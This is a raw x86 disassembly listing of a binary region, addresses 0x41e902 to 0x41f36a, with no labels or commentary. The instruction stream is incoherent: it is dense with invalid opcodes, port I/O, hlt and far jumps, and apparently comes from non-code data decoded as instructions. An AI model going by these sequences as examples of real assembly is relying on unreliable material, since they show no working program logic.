  41e902:	jg     0x41e942
  41e904:	sbb    cl,BYTE PTR [edi+edi*8]
  41e907:	xor    al,0xcf
  41e909:	mov    WORD PTR [edx+0x54],?
  41e90c:	jg     0x41e946
  41e90e:	sub    edx,DWORD PTR [esi-0x1f45cd42]
  41e914:	xor    bl,BYTE PTR [ebp+0x16]
  41e917:	aam    0x6f
  41e919:	cmp    DWORD PTR [eax],0x9057c765
  41e91f:	cs in  eax,0x8b
  41e922:	xor    eax,0xd747e476
  41e927:	mov    ecx,0xc0df6a9c
  41e92c:	inc    esi
  41e92d:	sbb    bl,BYTE PTR [esi]
  41e92f:	shl    edi,1
  41e931:	gs push 0xffffffe9
  41e934:	push   0x91f330a5
  41e939:	cmc    
  41e93a:	outs   dx,BYTE PTR ds:[esi]
  41e93b:	or     al,0xeb
  41e93d:	xchg   edx,eax
  41e93e:	fwait
  41e93f:	cdq    
  41e940:	addr16 mov bl,0xce
  41e943:	(bad)  
  41e944:	push   cs
  41e945:	jb     0x41e972
  41e947:	aad    0x4
  41e949:	enter  0xa348,0x52
  41e94d:	jne    0x41e8e7
  41e94f:	add    BYTE PTR [edi+ecx*8],bh
  41e952:	pop    ebp
  41e953:	inc    ebp
  41e954:	or     eax,0xbf674145
  41e959:	jae    0x41e908
  41e95b:	mov    esp,0x86b503ef
  41e960:	test   eax,0xefe6e0d
  41e965:	mov    ah,0x41
  41e967:	dec    ebx
  41e968:	jl     0x41e983
  41e96a:	pop    esp
  41e96b:	test   eax,0x1563d8
  41e970:	and    eax,DWORD PTR [esp+eax*4+0x73]
  41e974:	mov    BYTE PTR ss:[edx-0x32],dh
  41e978:	dec    esi
  41e979:	pop    edi
  41e97a:	sbb    BYTE PTR [ebp+0x135f2e3f],al
  41e980:	push   esp
  41e981:	pop    edx
  41e982:	pusha  
  41e983:	test   BYTE PTR [ebx+0x1c],al
  41e986:	inc    edi
  41e987:	aad    0x9d
  41e989:	lock nop
  41e98b:	mov    ?,WORD PTR [edx+0x62fda61f]
  41e991:	xchg   ebp,eax
  41e992:	ins    BYTE PTR es:[edi],dx
  41e993:	sub    bl,dl
  41e995:	hlt    
  41e996:	test   DWORD PTR [edx+0x64f74a78],ecx
  41e99c:	jmp    0x41e9ab
  41e99e:	mov    edx,0x2fe45677
  41e9a3:	aad    0x47
  41e9a5:	xor    edi,DWORD PTR [ecx+0x11]
  41e9a8:	mov    bl,0x28
  41e9aa:	les    eax,FWORD PTR [edx+0x38]
  41e9ad:	test   eax,0x4c39579
  41e9b2:	ins    DWORD PTR es:[edi],dx
  41e9b3:	mov    esi,0xab9a081d
  41e9b8:	xor    ch,BYTE PTR [eax+0x39]
  41e9bb:	dec    edi
  41e9bc:	loopne 0x41ea17
  41e9be:	or     BYTE PTR [ebx+ebp*2+0xc],ah
	...
  41ea31:	add    BYTE PTR [eax],al
  41ea33:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fst    QWORD PTR [ebx+0x7c60be48]
  41ea45:	dec    ecx
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	test   BYTE PTR [eax],0x0
  41ea4b:	add    al,al
  41ea4d:	aaa    
  41ea4e:	inc    edi
  41ea4f:	xor    ah,BYTE PTR [esi]
  41ea51:	cmp    DWORD PTR [ecx+0x679832a2],0xffffff9c
  41ea58:	popa   
  41ea59:	sub    al,0x92
  41ea5b:	pop    es
  41ea5c:	mov    BYTE PTR [edx+0x9],bl
  41ea5f:	out    0xe8,al
  41ea61:	in     eax,dx
  41ea62:	enter  0x6cb1,0x3f
  41ea66:	or     BYTE PTR [eax+ebp*4],dh
  41ea69:	pop    eax
  41ea6a:	dec    edx
  41ea6b:	jo     0x41e9f4
  41ea6d:	lea    ebx,fs:[ebp-0x1c]
  41ea71:	and    BYTE PTR [edx],0x76
  41ea74:	or     al,0x6d
  41ea76:	into   
  41ea77:	sub    DWORD PTR [esi-0x7e],eax
  41ea7a:	cmp    edi,edx
  41ea7c:	mov    eax,0x534eafe4
  41ea81:	ins    DWORD PTR es:[edi],dx
  41ea82:	mov    bh,0x38
  41ea84:	push   ecx
  41ea85:	xchg   ebp,eax
  41ea86:	outs   dx,BYTE PTR ds:[esi]
  41ea87:	adc    dl,bl
  41ea89:	mov    ah,0x27
  41ea8b:	(bad)  
  41ea8c:	in     al,0x99
  41ea8e:	in     al,dx
  41ea8f:	gs mov ebx,0xd530d82
  41ea95:	pop    ss
  41ea96:	popa   
  41ea97:	fwait
  41ea98:	ds pushf 
  41ea9a:	mov    dl,0x3a
  41ea9c:	(bad)  
  41ea9d:	imul   dx,WORD PTR [edx],0x66
  41eaa1:	dec    edi
  41eaa2:	outs   dx,DWORD PTR ds:[esi]
  41eaa3:	jecxz  0x41eace
  41eaa5:	(bad)
  41eaa9:	shl    DWORD PTR [eax+0x25d837f],0xba
  41eab0:	and    ah,BYTE PTR [eax-0x79]
  41eab3:	push   ds
  41eab4:	and    ch,al
  41eab6:	mov    esi,0xbac238f4
  41eabb:	cmp    al,0x4b
  41eabd:	add    eax,DWORD PTR [esi]
  41eabf:	sahf   
  41eac0:	adc    al,0x28
  41eac2:	nop
  41eac3:	and    eax,0xe54b5939
  41eac8:	fldcw  WORD PTR [ecx]
  41eaca:	leave  
  41eacb:	into   
  41eacc:	sub    eax,0x94f22e98
  41ead1:	fucomi st,st(0)
  41ead3:	fwait
  41ead4:	fwait
  41ead5:	pop    esi
  41ead6:	stos   DWORD PTR es:[edi],eax
  41ead7:	jmp    0x41eac6
  41ead9:	call   0x58745590
  41eade:	mov    BYTE PTR [edi-0x5e004e93],al
  41eae4:	jnp    0x41eb4c
  41eae6:	frstor [eax-0x1c905580]
  41eaec:	stc    
  41eaed:	xor    BYTE PTR [edx+0x21],dl
  41eaf0:	mov    BYTE PTR [edx-0x36],dl
  41eaf3:	mov    BYTE PTR [eax-0x7355e65a],bh
  41eaf9:	jge    0x41eb6d
  41eafb:	add    eax,0x6a6085e5
  41eb00:	sub    BYTE PTR [eax+0x6e],dh
  41eb03:	aam    0xe0
  41eb05:	push   0x17
  41eb07:	hlt    
  41eb08:	adc    al,0x35
  41eb0a:	in     eax,0xc
  41eb0c:	xchg   ecx,eax
  41eb0d:	shr    BYTE PTR [edi-0x79],1
  41eb10:	outs   dx,BYTE PTR ds:[esi]
  41eb11:	sub    cl,BYTE PTR [ebx+0x61]
  41eb14:	test   DWORD PTR [edi-0x75],eax
  41eb17:	cmp    bh,BYTE PTR [ecx+0x78598620]
  41eb1d:	jl     0x41eb72
  41eb1f:	mov    bh,0x4e
  41eb21:	mov    DWORD PTR [ecx-0x1e],eax
  41eb24:	mov    al,ds:0x569d18c3
  41eb29:	imul   esi,ebx,0x25492a29
  41eb2f:	out    dx,al
  41eb30:	xchg   BYTE PTR [edx+0x2d7152ed],ch
  41eb36:	jnp    0x41eb31
  41eb38:	out    dx,eax
  41eb39:	or     BYTE PTR [ecx-0x441c7af4],dh
  41eb3f:	test   DWORD PTR ds:0xdb,esi
	...
  41ebb1:	add    BYTE PTR [eax],al
  41ebb3:	add    BYTE PTR [edi-0x36],ch
  41ebb6:	adc    eax,0xefdfb598
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	into   
  41ebc1:	mov    eax,0x4a72b6df
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	test   BYTE PTR [eax],0x0
  41ebcb:	add    BYTE PTR [edi+0x6441ffce],dh
  41ebd1:	or     bh,BYTE PTR [edi-0x56]
  41ebd4:	outs   dx,BYTE PTR ds:[esi]
  41ebd5:	cdq    
  41ebd6:	xchg   BYTE PTR [edx-0xbf78dec],al
  41ebdc:	inc    edx
  41ebdd:	xor    ch,BYTE PTR [ebx]
  41ebdf:	add    al,0xce
  41ebe1:	test   eax,0xee114bc3
  41ebe6:	nop
  41ebe7:	add    ah,BYTE PTR [ecx]
  41ebe9:	pop    ss
  41ebea:	cmp    esp,DWORD PTR [ebp+0x5e41dea1]
  41ebf0:	outs   dx,BYTE PTR ds:[esi]
  41ebf1:	call   0x1791adb3
  41ebf6:	in     al,0x5a
  41ebf8:	cmc    
  41ebf9:	rcr    DWORD PTR [ebx],0xdf
  41ebfc:	fcom   DWORD PTR [edi+0x1e25eda1]
  41ec02:	push   ss
  41ec03:	gs jp  0x41ec61
  41ec06:	out    0x78,al
  41ec08:	and    BYTE PTR [ecx+0x6f9dabfc],dl
  41ec0e:	mov    ecx,0xbc0e5e90
  41ec13:	scas   eax,DWORD PTR es:[edi]
  41ec14:	in     eax,0xe0
  41ec16:	adc    DWORD PTR [edx-0x288c8a24],edx
  41ec1c:	iret   
  41ec1d:	ss add ch,ah
  41ec20:	or     DWORD PTR [edi],edi
  41ec22:	dec    edx
  41ec23:	dec    ebp
  41ec24:	adc    ecx,DWORD PTR [edx+0x3dcb31c1]
  41ec2a:	push   0x1d92e685
  41ec2f:	daa    
  41ec30:	fwait
  41ec31:	jbe    0x41ec71
  41ec33:	outs   dx,BYTE PTR ds:[esi]
  41ec34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec35:	xchg   BYTE PTR [ecx+0x19a35a12],dl
  41ec3b:	bound  eax,QWORD PTR ds:0x6245f6
  41ec41:	pushf  
  41ec42:	clc    
  41ec43:	loop   0x41ec0a
  41ec45:	mov    WORD PTR [ebp*1-0x6c7e6512],ds
  41ec4c:	lods   eax,DWORD PTR ds:[esi]
  41ec4d:	out    dx,eax
  41ec4e:	xchg   ebp,eax
  41ec4f:	sbb    eax,0xc785b221
  41ec54:	inc    ebp
  41ec55:	sbb    al,0xef
  41ec57:	and    eax,0xf4a035a6
  41ec5c:	mov    ds:0xab3f0fed,eax
  41ec61:	retf   0xfb4c
  41ec64:	retf   
  41ec65:	and    ch,BYTE PTR [eax+0x7e4bc7eb]
  41ec6b:	bound  ebp,QWORD PTR [eax-0x7e]
  41ec6e:	cwde   
  41ec6f:	and    eax,0x953a61b8
  41ec74:	pop    eax
  41ec75:	aas    
  41ec76:	lods   eax,DWORD PTR ds:[esi]
  41ec77:	cmp    eax,0x5e2d53c3
  41ec7c:	daa    
  41ec7d:	sbb    dh,BYTE PTR [edi-0x1e617d86]
  41ec83:	call   0x1a02:0xee5448a3
  41ec8a:	leave  
  41ec8b:	push   ds
  41ec8c:	sbb    eax,0x74c4f0a3
  41ec91:	pop    ebx
  41ec92:	cmp    ch,BYTE PTR [ecx+0x53]
  41ec95:	mov    ah,BYTE PTR [eax-0x67]
  41ec98:	stc    
  41ec99:	adc    al,0x4
  41ec9b:	sahf   
  41ec9c:	ins    DWORD PTR es:[edi],dx
  41ec9d:	repnz lods eax,DWORD PTR ds:[esi]
  41ec9f:	xor    ebp,edx
  41eca1:	loope  0x41ed0e
  41eca3:	dec    edx
  41eca4:	pop    ss
  41eca5:	dec    ecx
  41eca6:	ins    BYTE PTR es:[edi],dx
  41eca7:	dec    esi
  41eca8:	cmp    al,0x56
  41ecaa:	cld    
  41ecab:	cwde   
  41ecac:	nop
  41ecad:	cli    
  41ecae:	(bad)  
  41ecaf:	nop
  41ecb0:	cmp    BYTE PTR [ecx],0x54
  41ecb3:	(bad)  
  41ecb4:	(bad)
  41ecb7:	or     eax,0x1d071ec6
  41ecbc:	stos   BYTE PTR es:[edi],al
  41ecbd:	leave  
  41ecbe:	push   0x848de8
	...
  41ed33:	add    BYTE PTR [eax],ah
  41ed35:	repz das 
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	push   eax
  41ed41:	enter  0xa39d,0x68
  41ed45:	dec    ebx
  41ed46:	add    DWORD PTR [eax],eax
  41ed48:	test   BYTE PTR [eax],0x0
  41ed4b:	add    BYTE PTR [ebx+ebp*4+0x11d65ec1],al
  41ed52:	out    dx,eax
  41ed53:	dec    edi
  41ed54:	ss sbb edx,esi
  41ed57:	xor    ch,0x77
  41ed5a:	iret   
  41ed5b:	leave  
  41ed5c:	xor    eax,0x7038f5ab
  41ed61:	lea    ebx,[ebx-0x4a]
  41ed64:	inc    ebx
  41ed65:	xor    ebp,DWORD PTR [ecx-0xb]
  41ed68:	pushf  
  41ed69:	loopne 0x41ed21
  41ed6b:	xor    eax,0x246fa58
  41ed70:	iret   
  41ed71:	lods   al,BYTE PTR ds:[esi]
  41ed72:	mov    ch,0x64
  41ed74:	push   0x9b40b4aa
  41ed79:	mov    edi,DWORD PTR [ebx+ebx*8]
  41ed7c:	jbe    0x41edce
  41ed7e:	fdivr  QWORD PTR [ebx-0x40]
  41ed81:	mov    cl,0x63
  41ed83:	mov    eax,0xb8fb02dd
  41ed89:	fcomp  DWORD PTR [eax+0x1]
  41ed8c:	add    eax,0x7f5fdd42
  41ed91:	sub    ah,BYTE PTR [edx-0x39268a2c]
  41ed97:	shl    ecx,0x13
  41ed9a:	aaa    
  41ed9b:	or     BYTE PTR [ecx-0x5d],ch
  41ed9e:	jns    0x41ed7a
  41eda0:	mov    esi,0xac449d0c
  41eda5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eda6:	dec    ebp
  41eda7:	mov    fs,WORD PTR [ebp+0x18]
  41edaa:	fnstenv [edi-0x22]
  41edad:	jle    0x41edcb
  41edaf:	sub    DWORD PTR [eax],0xa4e40f01
  41edb5:	mov    bh,BYTE PTR [edx+0x54]
  41edb8:	popf   
  41edb9:	(bad)  
  41edba:	mov    esi,0x1ec0049f
  41edbf:	fs xchg esi,eax
  41edc1:	stc    
  41edc2:	test   eax,0xc86db618
  41edc7:	ja     0x41ee20
  41edc9:	test   BYTE PTR [eax],ah
  41edcb:	jle    0x41ed61
  41edcd:	rcr    bl,cl
  41edcf:	cmp    edx,DWORD PTR [eax+0x3a515528]
  41edd5:	das    
  41edd6:	mov    dl,0x8a
  41edd8:	adc    eax,0x442b2b7c
  41eddd:	shr    DWORD PTR [ebx+0x4bf5e4c3],0x50
  41ede4:	fiadd  DWORD PTR [ebx-0x91a7a0f]
  41edea:	(bad)  
  41edec:	add    esp,ebx
  41edee:	xlat   BYTE PTR ds:[ebx]
  41edef:	clc    
  41edf0:	ins    BYTE PTR es:[edi],dx
  41edf1:	push   0xb5589ae3
  41edf6:	add    cl,cl
  41edf8:	repz sub ch,BYTE PTR [eax]
  41edfb:	mov    al,0xec
  41edfd:	sbb    BYTE PTR [edx-0x48],cl
  41ee00:	scas   eax,DWORD PTR es:[edi]
  41ee01:	fidiv  WORD PTR [esi+0x69]
  41ee04:	sub    BYTE PTR [edi],dl
  41ee06:	popf   
  41ee07:	aas    
  41ee08:	rep outs dx,DWORD PTR ds:[esi]
  41ee0a:	test   ecx,ebp
  41ee0c:	and    eax,0x1b80280f
  41ee11:	loop   0x41ee79
  41ee13:	or     DWORD PTR [eax+0x1f],esi
  41ee16:	out    0x47,al
  41ee18:	sbb    edi,edi
  41ee1a:	jns    0x41ede0
  41ee1c:	or     al,BYTE PTR [ebp+0x1f]
  41ee1f:	mov    ebx,0xd231fe3b
  41ee24:	jae    0x41edb4
  41ee26:	mov    dl,0x3d
  41ee28:	inc    eax
  41ee29:	dec    ebx
  41ee2a:	lahf   
  41ee2b:	sbb    edi,esp
  41ee2d:	xor    ah,BYTE PTR [esi+0x1b]
  41ee30:	retf   
  41ee31:	test   al,0x31
  41ee33:	cmc    
  41ee34:	repz sub DWORD PTR [eax],edi
  41ee37:	scas   eax,DWORD PTR es:[edi]
  41ee38:	pop    eax
  41ee39:	repnz fs pop ds
  41ee3c:	retf   
  41ee3d:	je     0x41edf5
  41ee3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee40:	mov    ebp,0x71
	...
  41eeb1:	add    BYTE PTR [eax],al
  41eeb3:	add    BYTE PTR [edi],bh
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	pop    edi
  41eec1:	sbb    bh,BYTE PTR [esi+ecx*2]
  41eec4:	pop    esi
  41eec5:	dec    esp
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	test   BYTE PTR [eax],0x0
  41eecb:	add    BYTE PTR [ebp+0x3b],ch
  41eece:	inc    ebp
  41eecf:	popa   
  41eed0:	or     dl,BYTE PTR [edi-0x78]
  41eed3:	xlat   BYTE PTR ds:[ebx]
  41eed4:	ret    
  41eed5:	cmc    
  41eed6:	cmp    BYTE PTR [ebp-0x69],bh
  41eed9:	or     dh,BYTE PTR [edx-0x3630c68f]
  41eedf:	cmp    eax,0x6ae357f7
  41eee4:	lock xor ecx,edi
  41eee7:	dec    eax
  41eee8:	cdq    
  41eee9:	xor    esp,DWORD PTR ss:[ebx-0x34]
  41eeed:	cmp    eax,0x9fc8392d
  41eef2:	test   eax,0x965ba5b2
  41eef7:	lods   eax,DWORD PTR ds:[esi]
  41eef8:	lods   eax,DWORD PTR ds:[esi]
  41eef9:	or     ecx,DWORD PTR [ecx]
  41eefb:	jle    0x41eed9
  41eefd:	jecxz  0x41ee9f
  41eeff:	clc    
  41ef00:	pop    esp
  41ef01:	cmp    al,0x83
  41ef03:	popf   
  41ef04:	dec    ecx
  41ef05:	adc    al,0xab
  41ef07:	mov    esi,0x6170a71f
  41ef0c:	and    DWORD PTR [edx-0x7655904d],0x9447d257
  41ef16:	xchg   esi,eax
  41ef17:	xchg   ebx,eax
  41ef18:	dec    edx
  41ef19:	jmp    0x41eef8
  41ef1b:	jp     0x41ef9c
  41ef1d:	mov    BYTE PTR [ebx-0x80],al
  41ef20:	stos   DWORD PTR es:[edi],eax
  41ef21:	push   0xffffff9f
  41ef23:	mov    eax,0x58a14ad
  41ef28:	sahf   
  41ef29:	cmp    DWORD PTR [esi+0x46],edx
  41ef2c:	jb     0x41eec3
  41ef2e:	cmp    BYTE PTR [edi-0x6a],al
  41ef31:	inc    ebp
  41ef32:	cmp    eax,DWORD PTR [esi]
  41ef34:	jmp    0x41ef88
  41ef36:	xchg   ebx,eax
  41ef37:	je     0x41ef9c
  41ef39:	test   BYTE PTR [edi+0x1afb25ff],bh
  41ef3f:	pop    ss
  41ef40:	mov    bl,0xc1
  41ef42:	mov    edi,0x3139735a
  41ef47:	repz adc ebx,edi
  41ef4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ef4b:	sub    eax,0xbb89afec
  41ef50:	mov    al,ds:0x90750556
  41ef55:	pop    eax
  41ef56:	scas   al,BYTE PTR es:[edi]
  41ef57:	xchg   ebx,eax
  41ef58:	(bad)  
  41ef59:	xchg   edx,eax
  41ef5a:	mov    dh,BYTE PTR [edx+0x30]
  41ef5d:	scas   al,BYTE PTR es:[edi]
  41ef5e:	out    dx,eax
  41ef5f:	arpl   ax,di
  41ef61:	in     eax,0x16
  41ef63:	mov    ebx,DWORD PTR [esi+edx*8+0x44]
  41ef67:	pop    ds
  41ef68:	sub    al,0x28
  41ef6a:	ins    DWORD PTR es:[edi],dx
  41ef6b:	xchg   edx,ebx
  41ef6d:	add    BYTE PTR [ebx+0x64],dh
  41ef70:	push   es
  41ef71:	pop    ss
  41ef72:	push   eax
  41ef73:	jl     0x41eef7
  41ef75:	ret    0xfdb2
  41ef78:	inc    edi
  41ef79:	pop    ebp
  41ef7a:	cmp    BYTE PTR [esi+ebp*1],bh
  41ef7d:	lods   eax,DWORD PTR ds:[esi]
  41ef7e:	js     0x41ef48
  41ef80:	hlt    
  41ef81:	add    al,al
  41ef83:	adc    DWORD PTR [esi+0x1a],esi
  41ef86:	and    eax,0x225663bc
  41ef8b:	call   0xc15:0x761fb599
  41ef92:	jge    0x41ef9d
  41ef94:	adc    BYTE PTR [ebx+edi*4+0x31],dh
  41ef98:	dec    esp
  41ef99:	pop    ss
  41ef9a:	or     eax,0x7128901e
  41ef9f:	push   cs
  41efa0:	fisubr WORD PTR [ecx-0x14]
  41efa3:	out    dx,eax
  41efa4:	dec    esp
  41efa5:	xchg   ebx,eax
  41efa6:	and    cl,al
  41efa8:	fisttp DWORD PTR [esi]
  41efaa:	or     BYTE PTR [ecx-0x2961c962],0xd4
  41efb1:	out    dx,eax
  41efb2:	shl    DWORD PTR [ebx+0x452b816],1
  41efb8:	inc    edx
  41efb9:	mov    cl,dl
  41efbb:	scas   al,BYTE PTR es:[edi]
  41efbc:	out    dx,al
  41efbd:	bound  ecx,QWORD PTR [ebx+0x79d5b4]
	...
  41f033:	add    BYTE PTR [edi+0x53],cl
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4-0x10]
  41f041:	or     ebp,ebx
  41f043:	cmp    BYTE PTR [ebp+ecx*2+0x1],dl
  41f047:	add    dh,dh
  41f049:	add    BYTE PTR [eax],al
  41f04b:	add    BYTE PTR [esi],dh
  41f04d:	retf   
  41f04e:	jecxz  0x41efdd
  41f050:	mul    DWORD PTR [ecx+0x75]
  41f053:	aas    
  41f054:	rcl    DWORD PTR [esi+0x2269ff62],1
  41f05a:	sbb    BYTE PTR [ebx],dl
  41f05c:	ror    DWORD PTR [ecx-0x4c],0xae
  41f060:	js     0x41f00a
  41f062:	xchg   esi,eax
  41f063:	je     0x41efe5
  41f065:	data16 fucomi st,st(5)
  41f068:	mov    ebx,0xf30d975
  41f06d:	jno    0x41f01a
  41f06f:	fxch   st(4)
  41f071:	mov    fs,WORD PTR [ebp-0x4f5a0084]
  41f077:	adc    edi,DWORD PTR [eax]
  41f079:	pop    edi
  41f07a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f07b:	add    dh,ch
  41f07d:	ds cdq 
  41f07f:	sahf   
  41f080:	adc    ax,0xd054
  41f084:	fdivr  QWORD PTR ds:0x798a623
  41f08a:	adc    cl,bh
  41f08c:	add    eax,0x1297cf7b
  41f091:	fsub   DWORD PTR [esi+0x8]
  41f094:	das    
  41f095:	(bad)  
  41f096:	jmp    0xc210:0xaa196ee5
  41f09d:	mov    ecx,edi
  41f09f:	cli    
  41f0a0:	iret   
  41f0a1:	adc    ebx,esp
  41f0a3:	xor    eax,0xf54603af
  41f0a8:	cld    
  41f0a9:	cdq    
  41f0aa:	into   
  41f0ab:	cld    
  41f0ac:	sbb    al,0xa1
  41f0ae:	sub    BYTE PTR [edi-0x2f0255e6],bh
  41f0b4:	pusha  
  41f0b5:	or     BYTE PTR [esi-0x385bc2eb],dl
  41f0bb:	xor    DWORD PTR [edi+0x5ee064b2],ebp
  41f0c1:	cmovp  ebx,DWORD PTR [eax-0x2e2fdb75]
  41f0c8:	fucomip st,st(5)
  41f0ca:	mov    bl,0x6d
  41f0cc:	push   eax
  41f0cd:	xor    bh,BYTE PTR [ebx-0x7f]
  41f0d0:	or     eax,0xa4a22bfa
  41f0d5:	jbe    0x41f123
  41f0d7:	mov    esp,0xdda5926f
  41f0dc:	xor    DWORD PTR [ebx],edx
  41f0de:	push   0x93da600c
  41f0e3:	ret    0x8382
  41f0e6:	ss (bad) 
  41f0e9:	push   ebp
  41f0ea:	push   edx
  41f0eb:	push   ecx
  41f0ec:	(bad)  
  41f0ed:	sbb    edi,edx
  41f0ef:	jmp    0x41f11b
  41f0f1:	rcl    DWORD PTR [ecx-0x341ba641],0x21
  41f0f8:	dec    ebx
  41f0f9:	cmp    esp,DWORD PTR [ebx]
  41f0fb:	add    ebp,DWORD PTR [ebx]
  41f0fd:	and    BYTE PTR [eax-0x5c],dl
  41f100:	inc    ebx
  41f101:	enter  0x28f3,0x0
  41f105:	loopne 0x41f172
  41f107:	xor    ebp,DWORD PTR ds:0x3467f395
  41f10d:	sahf   
  41f10e:	push   ds
  41f10f:	jmp    0x41f146
  41f111:	ds ffree st(3)
  41f114:	test   eax,0x23ceef2a
  41f119:	add    cl,BYTE PTR ds:0x792d0966
  41f11f:	mov    al,0xb9
  41f121:	xchg   esi,eax
  41f122:	outs   dx,DWORD PTR ds:[esi]
  41f123:	inc    ebp
  41f124:	(bad)  
  41f125:	icebp  
  41f126:	je     0x41f10c
  41f128:	or     eax,0xc126791d
  41f12d:	jae    0x41f0b5
  41f12f:	loope  0x41f154
  41f131:	fs sahf 
  41f133:	fisttp DWORD PTR [ecx-0x13]
  41f136:	push   cs
  41f137:	mov    edx,0xe25681d1
  41f13c:	xchg   ecx,eax
  41f13d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f13e:	imul   ebx,DWORD PTR [esi],0xb5a3
	...
  41f1b4:	stos   DWORD PTR es:[edi],eax
  41f1b5:	add    dh,BYTE PTR [edi-0x1a]
  41f1b8:	push   edi
  41f1ba:	mov    ebx,0xee13144f
  41f1bf:	mov    edi,eax
  41f1c1:	addr16 jmp 0xf600:0x14e4a73
  41f1c9:	add    BYTE PTR [eax],al
  41f1cb:	add    BYTE PTR [ebx+0x75d52a0f],bh
  41f1d1:	xor    eax,0xafe1ceae
  41f1d6:	cmp    eax,0x9a12afd3
  41f1db:	xor    eax,0xc5e2e0be
  41f1e0:	mov    edx,0xfc0c5e16
  41f1e5:	arpl   WORD PTR [ecx+0x17ffe3fe],sp
  41f1eb:	pop    ebx
  41f1ec:	adc    DWORD PTR [edi],esp
  41f1ee:	popa   
  41f1ef:	(bad)  
  41f1f0:	stc    
  41f1f1:	fucomip st,st(7)
  41f1f3:	or     edx,DWORD PTR [ebx-0x78]
  41f1f6:	mov    al,ds:0xbb068332
  41f1fb:	mov    cl,0x3e
  41f1fd:	adc    al,0x71
  41f1ff:	or     al,0x9c
  41f201:	and    al,0x5b
  41f203:	repz cmp DWORD PTR [edx+0x4e],esi
  41f207:	add    eax,0x13a50a6d
  41f20c:	not    DWORD PTR [ebp+ebp*2+0x544e1483]
  41f213:	sub    eax,0x21696779
  41f218:	push   esp
  41f219:	push   edx
  41f21a:	and    DWORD PTR [esi],eax
  41f21c:	sti    
  41f21d:	mov    al,ds:0x5551ea05
  41f222:	or     edx,DWORD PTR [ebp+0x6214c765]
  41f228:	imul   eax,ecx,0xfffffffd
  41f22b:	mov    ds:0xd3159d7a,eax
  41f230:	sub    al,0x76
  41f232:	mov    al,ds:0xda17d61e
  41f237:	mov    ah,0x87
  41f239:	nop
  41f23a:	dec    ecx
  41f23b:	rcl    BYTE PTR [edx-0x10b0bf78],1
  41f241:	push   edx
  41f242:	cmp    ebx,ebp
  41f244:	pushf  
  41f245:	shl    BYTE PTR [esi+0xdcb2ec0],0x49
  41f24c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f24d:	and    DWORD PTR [ebx],ebx
  41f24f:	lahf   
  41f250:	xchg   ecx,eax
  41f251:	or     al,0x60
  41f253:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f254:	cs jmp 0x41f27d
  41f257:	add    DWORD PTR [edx],eax
  41f259:	push   ds
  41f25a:	jmp    0xbe2:0x41286d38
  41f261:	and    al,0xf0
  41f263:	ret    
  41f264:	or     DWORD PTR [ecx-0x7c712868],0xffffffc0
  41f26b:	xchg   ch,cl
  41f26d:	shl    BYTE PTR [ecx],0x72
  41f270:	add    esi,esi
  41f272:	cmp    dh,BYTE PTR [ebp+0x1c]
  41f275:	cwde   
  41f276:	pusha  
  41f277:	pop    ebx
  41f278:	lods   eax,DWORD PTR ds:[esi]
  41f279:	not    DWORD PTR [ebp+0x2fd8e336]
  41f27f:	ror    DWORD PTR [ecx],cl
  41f281:	pop    edi
  41f282:	mov    ds:0x1ef88cc7,al
  41f287:	pushf  
  41f288:	gs popf 
  41f28a:	push   ss
  41f28b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f28c:	push   es
  41f28d:	add    BYTE PTR [ebx+0x49aa9772],0x3b
  41f294:	(bad)  
  41f295:	xchg   ebx,eax
  41f296:	in     eax,dx
  41f297:	mov    ch,0x8e
  41f299:	fwait
  41f29a:	daa    
  41f29b:	sub    ecx,DWORD PTR ds:0x9eb419ca
  41f2a1:	test   eax,0xc4278bf9
  41f2a6:	leave  
  41f2a7:	mov    dl,0xb1
  41f2a9:	ins    DWORD PTR es:[edi],dx
  41f2aa:	sub    al,0xb6
  41f2ac:	lods   al,BYTE PTR ds:[esi]
  41f2ad:	pop    ecx
  41f2ae:	pop    edx
  41f2af:	mov    al,0xe9
  41f2b1:	jne    0x41f309
  41f2b3:	outs   dx,DWORD PTR ds:[esi]
  41f2b4:	fild   QWORD PTR [esi+0x10]
  41f2b7:	call   0xd182:0x1abb083f
  41f2be:	xchg   edx,eax
  41f2bf:	icebp  
  41f2c0:	xchg   ecx,eax
  41f2c1:	mov    cl,0x0
	...
  41f333:	add    BYTE PTR [ecx-0xe088ee],cl
  41f339:	jg     0x41f324
  41f33b:	xchg   esi,eax
  41f33c:	call   0x1aff:0x959531a0
  41f343:	rol    BYTE PTR [eax+0x4f],0x1
  41f347:	add    dh,dh
  41f349:	add    BYTE PTR [eax],al
  41f34b:	add    BYTE PTR [ebp+0x40],dl
  41f34e:	loope  0x41f3b0
  41f350:	jae    0x41f32c
  41f352:	mov    bh,0xd3
  41f354:	add    DWORD PTR [ebp-0x76dbd9f6],edx
  41f35a:	nop
  41f35b:	fisttp QWORD PTR [ebx+ecx*8]
  41f35e:	add    BYTE PTR [esi+0x517e764f],ah
  41f364:	lea    edx,[ebx+0x7f]
  41f367:	mov    dh,0x56
  41f369:	popa   
  41f36a:	xchg   ebx,eax
